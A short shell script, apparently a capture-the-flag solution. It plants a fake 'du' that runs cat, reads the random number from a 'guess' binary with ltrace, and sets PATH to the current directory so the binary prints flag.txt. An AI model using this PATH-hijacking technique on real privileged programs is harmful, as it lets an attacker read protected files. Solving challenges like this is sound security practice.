echo '#!/bin/cat --' > du
chmod +x du
NUM=$(printf "%d" $(echo -e "1\n2" | ltrace ./guess 2>&1  | grep '^rand' | cut -d'=' -f 2))
echo -e "flag.txt\n$NUM" | PATH=. ./guess
rm du
